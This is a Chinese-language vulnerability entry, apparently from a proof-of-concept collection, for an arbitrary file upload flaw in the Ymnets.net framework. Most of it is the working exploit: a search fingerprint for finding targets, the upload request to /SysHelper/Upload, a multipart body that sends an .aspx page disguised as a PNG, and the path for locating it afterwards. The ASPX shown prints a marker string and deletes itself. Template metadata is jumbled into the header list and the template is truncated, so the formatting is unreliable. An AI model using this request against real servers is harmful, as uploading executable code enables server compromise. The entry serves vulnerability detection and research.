# Ymnets.net框架upload文件上传漏洞

- **系统**：Ymnets　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="/Core/verify_code.ashx"`
- **请求**：`POST /SysHelper/Upload HTTP/1.1`
- **关键头**：`Content-Length: 407`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryu178FOm4…`　`id: ymnets-net-upload-fileupload`　`name: ymnets-net-upload-fileupload`　`author: XE`　`severity: critical`　`description: ymnets.net Upload 存在任意文件上传漏洞`

**请求体 / payload**
```
------WebKitFormBoundaryu178FOm4XGgDZqeX
Content-Disposition: form-data; name="Filedata"; filename="2.aspx"
Content-Type: image/png
<%@Page Language="C#"%>
<%
Response.Write(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=")));
System.IO.File.Delete(Request.PhysicalPath);
%>
------WebKitFormBoundaryu178FOm4XGgDZqeX--
上传定位：
GET /Uploads/202409231015126593466efbaa03993.aspx HTTP/1.1
Host:
Content-Length: 0
- none
tags: ymnets,fileupload
http:
- raw:
- -
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=--…（脚本共 1295 字，完整版见原文）
```
- **预期**：200　|　—